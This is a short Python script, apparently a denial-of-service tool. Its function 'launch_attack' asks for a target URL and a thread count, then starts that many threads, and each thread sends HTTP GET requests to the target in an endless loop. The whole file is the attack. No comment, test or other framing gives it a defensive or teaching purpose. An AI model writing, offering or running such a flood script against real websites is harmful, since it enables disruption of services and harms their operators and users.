import requests
import threading

def send_request(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Request sent to {url}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {url}: {e}")

def launch_attack(url, num_threads):
    for _ in range(num_threads):
        threading.Thread(target=send_request, args=(url,)).start()

if __name__ == "__main__":
    target_url = input("ENTER URL: ")
    num_threads = int (input("ENTER THREADS: "))

    launch_attack(target_url, num_threads)











